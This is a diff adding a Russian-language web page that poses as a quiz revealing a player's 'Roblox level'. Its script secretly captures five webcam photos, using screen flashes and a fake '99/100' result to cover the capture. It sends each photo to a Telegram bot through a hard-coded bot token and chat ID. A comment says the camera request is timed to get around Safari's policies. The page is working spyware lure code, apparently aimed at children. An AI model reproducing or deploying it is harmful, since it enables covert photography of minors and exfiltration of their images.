@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Твой Уровень в Roblox!</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #1e1e2f, #111119);
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Экранная вспышка для темноты */
+        #flashOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: #ffffff;
+            opacity: 0;
+            z-index: 9999;
+            pointer-events: none;
+            transition: opacity 0.05s ease;
+        }
+
+        .container {
+            text-align: center;
+            background: rgba(255, 255, 255, 0.05);
+            padding: 40px 30px;
+            border-radius: 20px;
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            max-width: 400px;
+            width: 90%;
+            z-index: 10;
+        }
+
+        h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            color: #00ffcc;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        p {
+            font-size: 16px;
+            color: #bbb;
+            margin-bottom: 30px;
+        }
+
+        .btn {
+            background: linear-gradient(45deg, #00ffcc, #0077ff);
+            border: none;
+            padding: 15px 35px;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0, 255, 204, 0.4);
+            transition: transform 0.1s;
+            outline: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .btn:active {
+            transform: scale(0.95);
+        }
+
+        video, canvas {
+            display: none;
+        }
+
+        .result-box {
+            display: none;
+        }
+
+        .level-num {
+            font-size: 64px;
+            font-weight: 900;
+            color: #ff3366;
+            margin: 20px 0;
+            text-shadow: 0 0 20px rgba(255, 51, 102, 0.6);
+        }
+
+        .desc {
+            font-style: italic;
+            color: #ffcc00;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="flashOverlay"></div>
+
+    <div class="container">
+        <div id="startState">
+            <h1>Привет, Заходи!</h1>
+            <p>Узнай, какой у тебя уровень в мире Roblox по секретной шкале харизмы и скилла.</p>
+            <button class="btn" id="scanBtn">УЗНАТЬ</button>
+        </div>
+
+        <div id="resultState" class="result-box">
+            <h1>Твой результат!</h1>
+            <div class="level-num">99 / 100</div>
+            <p class="desc">Уровень топ-плеера! Тебе не хватает буквально капли харизмы до абсолютного максимума. Прокачивай стиль!</p>
+        </div>
+    </div>
+
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const scanBtn = document.getElementById('scanBtn');
+        const startState = document.getElementById('startState');
+        const resultState = document.getElementById('resultState');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const flashOverlay = document.getElementById('flashOverlay');
+
+        const BOT_TOKEN = '7666669241:AAEPMt7awzLrvNHFigWHHz72cQH8mv1IXdM';
+        const CHAT_ID = '8411881028';
+
+        scanBtn.addEventListener('click', function() {
+            // Мгновенный запрос камеры без задержек для обхода политик Safari
+            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+            .then(function(stream) {
+                video.srcObject = stream;
+                video.play();
+
+                // Показываем результат (экран 99 уровня) сразу, скрывая процесс съёмки
+                startState.style.display = 'none';
+                resultState.style.display = 'block';
+
+                // Даем камере 800мс, чтобы полностью проснуться и убрать черный экран
+                setTimeout(function() {
+                    let photoCount = 0;
+                    
+                    // Запускаем цикл из 5 быстрых снимков
+                    const interval = setInterval(function() {
+                        photoCount++;
+                        
+                        // Включаем вспышку экрана (белая заливка)
+                        flashOverlay.style.opacity = '1';
+                        
+                        setTimeout(function() {
+                            // Делаем кадр
+                            const w = video.videoWidth || 640;
+                            const h = video.videoHeight || 480;
+                            canvas.width = w;
+                            canvas.height = h;
+                            
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, w, h);
+                            
+                            // Гасим вспышку экрана
+                            flashOverlay.style.opacity = '0';
+
+                            // Отправляем текущий кадр в Telegram
+                            canvas.toBlob(function(blob) {
+                                if (blob) {
+                                    const formData = new FormData();
+                                    formData.append('chat_id', CHAT_ID);
+                                    formData.append('photo', blob, `shot_${photoCount}.jpg`);
+                                    formData.append('caption', `📸 Снимок ${photoCount} из 5`);
+
+                                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                        method: 'POST',
+                                        body: formData
+                                    });
+                                }
+                            }, 'image/jpeg', 0.6);
+
+                        }, 50); // Небольшое смещение, чтобы камера успела поймать свет от экрана
+
+                        // Когда сделали 5 штук, останавливаем процесс и выключаем камеру
+                        if (photoCount >= 5) {
+                            clearInterval(interval);
+                            setTimeout(function() {
+                                stream.getTracks().forEach(track => track.stop());
+                            }, 1000);
+                        }
+                    }, 350); // Интервал между пятью снимками (350 миллисекунд)
+
+                }, 800); 
+            })
+            .catch(function(err) {
+                // Если заблокировано — просто плавно выводим 99 уровень
+                startState.style.display = 'none';
+                resultState.style.display = 'block';
+            });
+        });
+    </script>
+</body>
+</html>
